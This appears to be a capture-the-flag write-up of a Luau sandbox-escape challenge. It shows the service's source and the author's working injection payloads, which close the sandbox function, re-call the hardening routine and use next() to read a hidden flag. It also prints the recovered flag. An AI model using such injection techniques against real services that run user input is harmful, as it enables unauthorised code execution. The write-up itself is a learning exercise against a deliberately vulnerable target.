# Lua Tax Calculator
This challenge made you connect to a socket via netcat. It prompted you for some simple math and plugged your input into a lua script that would execute.
```
Tax time! :)
Math library is available. Example: 2 + math.sqrt(4)

Enter your tax calculation:
(Input Here)

Result:
(Result of the script)

Errors:
(Errors here)
```
The challenge gave you the source code of the the lua file and the python script running it. The python script wasn't very important to the challenge. The real challenge was to escape the lua sandboxing it put in place to stop people from simplying printing the flag. Here's the lua script they ran:
```lua
function hardening(sandbox)
    local env = table.clone(_G)
    env._G = table.clone(env)
    _G = env._G

    env.flag = setmetatable({[math.random()] = "brunner{REDACTED}"}, 
                            {__index = function() return tostring(flag) end,
                             __tostring = function() return tostring(flag) end})
    env.sandbox = sandbox

    -- Remove dangerous functions from environment & global table
    local illegalFunctions = {
        "print", "getfenv", "setfenv", "error", "loadstring", "load", "debug", "os", 
        "package", "newproxy", "buffer", "pcall", "bit32", "xpcall", "rawset", "next",
        "rawget", "getmetatable", "setmetatable", "collectgarbage", "assert", "gcinfo",
        "string", "rawequal", "loadlibrary", "require", "coroutine", "utf8"
    }
    for _, func in illegalFunctions do
        env[func] = nil
        _G[func] = nil
    end

    -- Enforce sandboxed environment
    setfenv(1, env)
    return sandbox(table.clone(env))
end

function sandbox(env)
    setfenv(1, env)
    flag = nil -- Don't leak the flag!
    -- Tax calculations
    local result = <INSERT_CODE_HERE>
    return result
end

print(hardening(sandbox))
```
At first glance, this seemed like a very very difficult challenge to me. The lua code stripped any functions that could help me print the flag. You couldn't call 'hardening' from the sanboxed function. And last of all, it set the flag to nil so that you couldn't even access it. I tested all of this inside the function, then I remembered the challenge was to escape the sanbox. To understand this challenge let's quickly look at what the python code did.
```py

def main():
    print("Tax time! :)")
    print("Math library is available. Example: 2 + math.sqrt(4)")
    while True:
        try:
            print("\nEnter your tax calculation:")
            payload = input()

            if ";" in payload:
                print("\nError: Nuh-uh, you only get ONE expression")
                continue

            with open("main.luau", "r") as f:
                source_code = f.read()

            modified_code = source_code.replace("<INSERT_CODE_HERE>", payload)

            fd, temp_path = tempfile.mkstemp(suffix=".luau")
            os.close(fd)

            with open(temp_path, "w") as f:
                f.write(modified_code)

            try:
                result = subprocess.run(["luau", temp_path], capture_output=True, text=True, timeout=1)
                print("\nResult:")
                print(result.stdout)

                if result.stderr:
                    print("\nErrors:")
                    print(result.stderr)
            except subprocess.TimeoutExpired:
                print("\nError: That takes wayyy too long")
            finally:
                if os.path.exists(temp_path):
                    os.remove(temp_path)

        except (EOFError, KeyboardInterrupt):
            break
        except Exception as e:
            print(f"\nError: {e}")
```
All the code does is take in any inputs and replace '<INSERT_CODE_HERE>' with the input. So if you input 1+1, the code would be:
```lua
local result = 1+1
return result
```
It also prevented multiple expressions with these lines:
```py

            if ";" in payload:
                print("\nError: Nuh-uh, you only get ONE expression")
                continue
```
The first thing I did when I saw this challenge was use lua statements to debug the environment I was in. I ran this code to make the result print out environment information:
```lua

Enter your tax calculation:
(function() local str = "" for k,v in pairs(_G) do if type(v) == "table" then for kk,vv in pairs(v) do str = str .. tostring(kk) .. "=" .. tostring(vv) .. ", " end end end return str end)()

Result:
clamp=function: 0x000001b39c808cf0, ceil=function: 0x000001b39c808d80, floor=function: 0x000001b39c808db0, abs=function: 0x000001b39c808d50, one=1, 1, 1, create=function: 0x000001b39c808ed0, zero=0, 0, 0, min=function: 0x000001b39c808c90, max=function: 0x000001b39c808cc0, magnitude=function: 0x000001b39c808ea0, cross=function: 0x000001b39c808e40, sign=function: 0x000001b39c808d20, angle=function: 0x000001b39c808de0, dot=function: 0x000001b39c808e10, normalize=function: 0x000001b39c808e70, log=function: 0x000001b39c809d40, ldexp=function: 0x000001b39c809da0, deg=function: 0x000001b39c809e90, cosh=function: 0x000001b39c809ef0, round=function: 0x000001b39c809a40, random=function: 0x000001b39c809c20, frexp=function: 0x000001b39c809dd0, tanh=function: 0x000001b39c809b30, floor=function: 0x000001b39c809e30, max=function: 0x000001b39c809d10, sqrt=function: 0x000001b39c809b60, modf=function: 0x000001b39c809cb0, huge=inf, pow=function: 0x000001b39c809c80, acos=function: 0x000001b39c809fe0, tan=function: 0x000001b39c809b00, cos=function: 0x000001b39c809ec0, pi=3.141592653589793, atan=function: 0x000001b39c809f50, map=function: 0x000001b39c809a10, sign=function: 0x000001b39c809a70, ceil=function: 0x000001b39c809f20, clamp=function: 0x000001b39c809aa0, noise=function: 0x000001b39c809ad0, abs=function: 0x000001b39c80a010, exp=function: 0x000001b39c809e60, sinh=function: 0x000001b39c809bc0, asin=function: 0x000001b39c809fb0, min=function: 0x000001b39c809ce0, randomseed=function: 0x000001b39c809bf0, fmod=function: 0x000001b39c809e00, rad=function: 0x000001b39c809c50, atan2=function: 0x000001b39c809f80, log10=function: 0x000001b39c809d70, sin=function: 0x000001b39c809b90, lerp=function: 0x000001b39c8099e0, string=table: 0x000001b39c80a400, xpcall=function: 0x000001b39c80ab20, tostring=function: 0x000001b39c80ac40, gcinfo=function: 0x000001b39c80aee0, os=table: 0x000001b39c80a520, typeof=function: 0x000001b39c80abe0, require=function: 0x000001b39c840790, getfenv=function: 0x000001b39c80aeb0, setmetatable=function: 0x000001b39c80aca0, next=function: 0x000001b39c80ae50, assert=function: 0x000001b39c80af40, rawlen=function: 0x000001b39c80ad30, tonumber=function: 0x000001b39c80ac70, rawequal=function: 0x000001b39c80adc0, collectgarbage=function: 0x000001b39c808bd0, getmetatable=function: 0x000001b39c80ae80, utf8=table: 0x000001b39c8098c0, rawset=function: 0x000001b39c80ad60, vector=table: 0x000001b39c808f00, math=table: 0x000001b39c80a040, print=function: 0x000001b39c80adf0, pcall=function: 0x000001b39c80ab50, buffer=table: 0x000001b39c809440, bit32=table: 0x000001b39c809770, type=function: 0x000001b39c80ac10, debug=table: 0x000001b39c809980, pairs=function: 0x000001b39c82af90, select=function: 0x000001b39c80ad00, _VERSION=Luau, _G=table: 0x000001b39c80b060, rawget=function: 0x000001b39c80ad90, loadstring=function: 0x000001b39c808c00, unpack=function: 0x000001b39c80a580, table=table: 0x000001b39c80a8e0, setfenv=function: 0x000001b39c80acd0, coroutine=table: 0x000001b39c80aac0, ipairs=function: 0x000001b39c82afd0, error=function: 0x000001b39c80af10, newproxy=function: 0x000001b39c80ae20, getn=function: 0x000001b39c80a820, foreachi=function: 0x000001b39c80a850, foreach=function: 0x000001b39c80a880, sort=function: 0x000001b39c80a760, unpack=function: 0x000001b39c80a700, freeze=function: 0x000001b39c80a610, clear=function: 0x000001b39c80a640, pack=function: 0x000001b39c80a730, move=function: 0x000001b39c80a6d0, insert=function: 0x000001b39c80a7c0, create=function: 0x000001b39c80a6a0, maxn=function: 0x000001b39c80a7f0, isfrozen=function: 0x000001b39c80a5e0, concat=function: 0x000001b39c80a8b0, clone=function: 0x000001b39c80a5b0, find=function: 0x000001b39c80a670, remove=function: 0x000001b39c80a790,
```
I was very aware that the flag was a table with a metatable set, and I wanted to see where the flag could actually be accessed from. Simplying doing _G.flag wouldn't print anything, neither would env.flag:
```

Enter your tax calculation:
_G.flag

Result:
nil

Enter your tax calculation:
env.flag

Result:
nil
```

I realised I was doing this extremely stupidly and the real challenge was to escape the sandbox. When you think of this challenge as replacing the code inside of the lua file, It became a lot easier. I broke out of the function using a simple 'end', but that threw an error. So I still provided something to finish the statement made, so I did '1 end'. But now here comes the problem of the remaining:
```lua
    return result
end
```
And for this, I simply just made another function, I orginally used 'function test()', but decided to be nice to the challenge developers and made it 'function test(result)'. Absolutely pointless, but worked. So my entire escaped string was:
```lua
1 end --[[escaped code here]] function test(result)
```
And to luaU, it would look like:
```lua

function sandbox(env)
    setfenv(1, env)
    flag = nil -- Don't leak the flag!
    -- Tax calculations
    local result = 1 
end 

--[[escaped code here]] 

function test(result)
    return result
end

print(hardening(sandbox))
```
Now how was I planning on getting the flag? The flag isn't defined in the global table. The flag was defined inside of the sandboxing function, 'hardening'. I simply called the function again with my own function as the parameter. It clicked in my mind that the flag was set inside of 'env', but I couldn't access that variable without calling it. Now the beauty of this is that my function wasn't restricted to the functions the 'sandbox' function was. sanbox set the current environment to the env variable passed in, and removed the flag from the environment.
```lua

function sandbox(env)
    setfenv(1, env) -- set the current environment to env
    flag = nil -- Don't leak the flag! Removes the flag from the environment
```
The input I tested was this:
```lua
1 end function ILoveBreaks(env) print(env) end hardening(ILoveBreaks) function test() -- yes, these were the real names I used during the CTF.
```
So the lua would read this:
```lua

function sandbox(env)
    setfenv(1, env)
    flag = nil -- Don't leak the flag!
    -- Tax calculations
    local result = 1 
end 

function ILoveBreaks(env) 
    print(env) 
end 
hardening(ILoveBreaks) 

function test()
    return result
end

print(hardening(sandbox))
```
this input passed in the entire environment to my own function which I could freely call things such as print. Now the part of the challenge that got me stuck the most ( and somehow not talked about yet): The flag.
```lua
    env.flag = setmetatable({[math.random()] = "brunner{REDACTED}"}, 
                            {__index = function() return tostring(flag) end,
                             __tostring = function() return tostring(flag) end})
```
What the challenge did was change the metatable of the flag. It originally was just a table with a random index set to the flag. But with the meta table, any calls such as flag[0] or print(env.flag) would just print nil. This took the longest for me to get around as I tried everything. Because the CTF provided the challenge files, I loaded it up locally and changed the lua code to return "Flag Name Here" instead of tostring(flag) which equaled "nil". testing my input with 'print(env.flag)' resulted in this:
```lua
Enter your tax calculation:
1 end function ILoveBreaks(env) print(env.flag) end hardening(ILoveBreaks) function test()

Result:
Flag Name Here
```
This would have normally printed nil but due to my change, It didn't. I had access to things such as getmetatable so I tried printing out the value of 'getmetatable(env.flag)' but that yielded no results.
```lua
Enter your tax calculation:
1 return result end function ILoveBreaks(env) for k,v in pairs(getmetatable(env.flag)) do print(k,v) end end hardening(ILoveBreaks) function test(result)

Result:
__index function: 0x00007f127a956ae8
__tostring      function: 0x00007f127a956ac8
```
I know how metatables usually work and if you tried to normally get an index from a table with a metatable, it would cause infinite recursion. The correct way to do it was using rawget.
```lua
local testTable = {
    [1] = "Hello, World!"
}
-- wrong
setmetatable(testTable, {
    __index = function(index) 
        return testTable[index] -- would cause recursion
    end
})
-- right
setmetatable(testTable, {
    __index = function(index) 
        return rawget(testTable, index)-- would cause recursion
    end
})
```
So I tried that with the flag:
```lua
Enter your tax calculation:
1 return result end function ILoveBreaks(env) print(rawget(env.flag,0)) end hardening(ILoveBreaks) function test(result)

Result:
nil
```
But the only problem was, I didn't know the index of the flag so I couldn't use rawget. What finally made it click was when I saw what was next to rawset in the list of 'illegalFunctions' while looking for rawget.
```lua
local illegalFunctions = {
        "print", "getfenv", "setfenv", "error", "loadstring", "load", "debug", "os", 
        "package", "newproxy", "buffer", "pcall", "bit32", "xpcall", "rawset", "next",
        "rawget", "getmetatable", "setmetatable", "collectgarbage", "assert", "gcinfo",
        "string", "rawequal", "loadlibrary", "require", "coroutine", "utf8"
    }
```
I have never used the 'next' function in lua as It was borderline obsolete. But I knew it could be used on tables, the next function when called with a table prints out the first index and the value of a table. So as an example:
```lua
local testTable = {
    [0] = "Hello, ",
    [1] = "World!",
}
local i, v = next(testTable)
print(i, v) -- Output: 0 Hello, 
i, v = next(testTable, i)
print(i, v) -- Output: 1, World!
```
Using this, I tried this input in the actual challenge socket:
```lua
1 return result end function ILoveBreaks(env) print(next(env.flag)) end hardening(ILoveBreaks) function test(result)
```
and thank god because the result was the flag,
```lua
Enter your tax calculation:
1 return result end function ILoveBreaks(env) print(next(env.flag)) end hardening(ILoveBreaks) function test(result)

Result:
0.41657587281769637     brunner{Wi1d_SaNdB0x_3Sc4p3_br0}
```
Now, why did this work? the input I provided first escaped the sandbox function as shown before. It got the environment the flag was in by calling another function as a parameter to 'hardening'. And finally, got past the metatable using the 'next' function. In total, the final payload looked like this in the code:
```lua

function sandbox(env)
    setfenv(1, env)
    flag = nil -- Don't leak the flag!
    -- Tax calculations
    local result = 1 
    return result -- I unfortunately did add the return back just so It would stop throwing errors at me
end 

function ILoveBreaks(env) 
    print(next(env.flag)) -- 0.41657587281769637     brunner{Wi1d_SaNdB0x_3Sc4p3_br0}
end 

hardening(ILoveBreaks) 

function test(result)
    return result
end

print(hardening(sandbox))
```
This was a very fun challenge to me and I could not thank the creator of it any more than I have. I had an absolute blast doing this challenge!